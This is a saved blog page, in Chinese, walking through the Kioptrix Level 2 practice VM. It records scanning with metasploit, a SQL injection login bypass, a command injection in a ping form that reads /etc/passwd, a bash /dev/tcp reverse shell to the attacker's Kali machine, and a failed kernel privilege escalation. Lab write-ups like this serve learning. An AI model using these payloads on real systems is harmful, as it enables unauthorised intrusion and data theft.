<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>kioptrix level 2（命令执行漏洞）</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">kioptrix level 2（命令执行漏洞）</h1>
        <div class="show-content">
          <p>kioptrix :192.168.1.117         kali linux :192.168.1.111             <a href="http://www.jianshu.com/p/dc21906c957f" target="_blank">上一篇</a> ----- <a href="https://www.jianshu.com/p/abf4499e5b72" target="_blank">参考</a></p><p>开放端口：22（ssh），80（http），111（rpcbind），443（https），616（sco-sysmgr），631（ipp），3306（mysql）</p><p>后续探测：use scanner/ssh/ssh_version （metasploit 扫描）</p><blockquote><p>[*] 192.168.1.117:22 SSH server version: <b>SSH-1.99-OpenSSH_3.9p1</b> ( service.version=3.9p1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH )</p></blockquote><p>版本OpenSSH 3.9p1，暴力破解登陆失败</p><p>探测二：use auxiliary/scanner/mysql/mysql_login</p><blockquote><p>192.168.1.117:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.</p></blockquote><p>不支持目标mysql的版本</p><p>探测三：use  auxiliary/scanner/mysql/mysql_version</p><blockquote><p>192.168.1.117:3306 is running MySQL, but responds with an error: \x04Host '192.168.1.111' is not allowed to connect to this MySQL server</p></blockquote><p>192.168.1.111是kali的ip，不被允许连接mysql服务器</p><p>探测四：浏览器打开 http://192.168.1.117</p><p>显示     http://192.168.1.117/index.php</p><div class="image-package">
<img src="http://upload-images.jianshu.io/upload_images/2883590-27f68fe10b7d8745.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-27f68fe10b7d8745.PNG?imageMogr2/auto-orient/strip" data-image-slug="27f68fe10b7d8745" data-width="403" data-height="213"><br><div class="image-caption"></div>
</div><p>随便输入了一些字符，错误的话直接跳转回上面页面。输入单引号没反应。</p><p>输入 admin'or'1'='1，密码随意。<a href="http://www.jianshu.com/p/4469faff917f" target="_blank">如果你不会click here</a> </p><div class="image-package">
<img src="http://upload-images.jianshu.io/upload_images/2883590-3278cc9e7e761bd7.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-3278cc9e7e761bd7.PNG?imageMogr2/auto-orient/strip" data-image-slug="3278cc9e7e761bd7" data-width="645" data-height="166"><br><div class="image-caption"></div>
</div><p>基本管理员web控制台，这社么玩意儿？</p><p>输入192.168.1.1，点submit</p><div class="image-package">
<img src="http://upload-images.jianshu.io/upload_images/2883590-aea7096381b2b977.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-aea7096381b2b977.PNG?imageMogr2/auto-orient/strip" data-image-slug="aea7096381b2b977" data-width="526" data-height="260"><br><div class="image-caption"></div>
</div><p>输入正确网段内ip，就执行ping操作；输入错误网段ip，依然执行，不过显示目标主机不可达</p><p>输入任意字符，不响应，直接在网页返回你输入的字符。</p><p>……</p><p>……</p><p>……</p><p>我真是傻了，能用sql语句进入，说明后台有数据库有sql注入嘛，直接用sqlmap啊</p><p>en…… 但是好像没有注入点id=x，sql不精通啊，算了</p><p>探测五：<b>https</b>://192.168.1.117</p><blockquote><p>显示“192.168.1.117 的网站管理员未正确配置网站。为避免您的信息被窃，Firefox 没有与该网站建立连接。”</p></blockquote><p>仍然继续，click</p><p>e……还是那个操蛋的页面，进去看了看，和80端口提供的一样。</p><hr><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">回连shell</a></p><blockquote>
<p>如何你能够幸运地找到命令行执行漏洞，很快你可能会想要一个交互式的shell。</p>
<p>如果不可能添加一个新的用户/ssh key/.rhosts文件，并登入，你下一步可能是扔回一个反弹shell或者绑定一个shell到TCP端口。</p>
<p>你能够创建反弹shell取决于目标系统上安装的脚本语言——虽然你也可以上传一个二进制程序，如果你有了很好的准备的话。</p>
<p>下面的例子为unix-like系统定制。一些例子同样能够在windows下运行，如果你使用cmd.exe和‘/bin/sh -i’</p>
<p>……</p>
<p><br></p>
</blockquote><p>看完这篇文章，发现自己对于shell and shell script的掌握还显不够。</p><blockquote>
<p>192.168.1.1；cat etc/passwd/   </p>
<p>输入这个命令，分号使得后面<b>显示密码文件的命令顺便也执行了</b>。</p>
</blockquote><div class="image-package">
<img src="http://upload-images.jianshu.io/upload_images/2883590-be9d1e861c2556fa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-be9d1e861c2556fa.PNG?imageMogr2/auto-orient/strip" data-image-slug="be9d1e861c2556fa" data-width="521" data-height="300"><br><div class="image-caption"><a href="http://www.jianshu.com/p/73f75e3e1e47" target="_blank">账号管理</a></div>
</div><blockquote><p>nc -l -p 888     kali上执行netcat，监听本地888端口</p></blockquote><blockquote><p>192.168.1.1;bash -i &gt;&amp; /dev/tcp/192.168.1.111/888 0&gt;&amp;1      反弹shell到kali888端口</p></blockquote><div class="image-package">
<img src="http://upload-images.jianshu.io/upload_images/2883590-824ce41a26a8d24a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-824ce41a26a8d24a.PNG?imageMogr2/auto-orient/strip" data-image-slug="824ce41a26a8d24a" data-width="324" data-height="55"><br><div class="image-caption">成功啦<br>
</div>
</div><p>uname -a</p><blockquote><p>Linux kioptrix.level2 <i><b>2.6.9-</b></i>55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</p></blockquote><p>搜索到一个<a href="https://www.exploit-db.com/exploits/9542/" target="_blank">特权用户提权漏洞</a> ，版本是：Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)</p><p>参考<a href="http://blog.csdn.net/a5534789/article/details/52157293" target="_blank">nginx的静态web服务器设置</a></p><div class="image-package">
<img src="http://upload-images.jianshu.io/upload_images/2883590-edf66f264dda7eb7.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-edf66f264dda7eb7.PNG?imageMogr2/auto-orient/strip" data-image-slug="edf66f264dda7eb7" data-width="302" data-height="226"><br><div class="image-caption"></div>
</div><div class="image-package">
<img src="http://upload-images.jianshu.io/upload_images/2883590-897f95b1657eec9d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-897f95b1657eec9d.PNG?imageMogr2/auto-orient/strip" data-image-slug="897f95b1657eec9d" data-width="307" data-height="193"><br><div class="image-caption"></div>
</div><p>于是内网就可以通过浏览器访问攻击机4300端口，下载hole.c文件。</p><hr><p>cannot write to hole.c ？明明都200 ok了，为什么！为什么！</p><p>为什么是can't write ,wget不是下载命令吗，怎么会拒绝写入，是什么鬼</p><div class="image-package">
<img src="http://upload-images.jianshu.io/upload_images/2883590-05794e22c7f9ef4e.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-05794e22c7f9ef4e.PNG?imageMogr2/auto-orient/strip" data-image-slug="05794e22c7f9ef4e" data-width="452" data-height="205"><br><div class="image-caption"></div>
</div><p>好了，提权失败了。</p><p><a href="http://www.jianshu.com/p/de31a69adcfa" target="_blank">后续</a></p>
        </div>
      </div>
    </div>
  </body>
</html>
